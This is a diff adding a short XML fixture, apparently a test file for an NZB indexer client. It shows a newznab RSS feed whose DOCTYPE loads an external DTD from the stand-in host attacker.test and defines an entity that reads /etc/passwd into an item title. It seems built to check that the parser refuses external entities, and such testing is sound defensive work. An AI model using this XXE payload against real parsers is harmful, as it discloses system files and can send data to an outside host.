@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss SYSTEM "http://attacker.test/evil.dtd" [
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+]>
+<rss version="2.0" xmlns:newznab="http://www.newznab.com/DTD/2010/feeds/attributes/">
+<channel>
+<item>
+  <title>&secret;</title>
+  <guid>external</guid>
+  <enclosure url="@ORIGIN@@BASE@/api?t=get&amp;id=nzb-external&amp;apikey=@KEY@" length="1" type="application/x-nzb"/>
+</item>
+</channel>
+</rss>
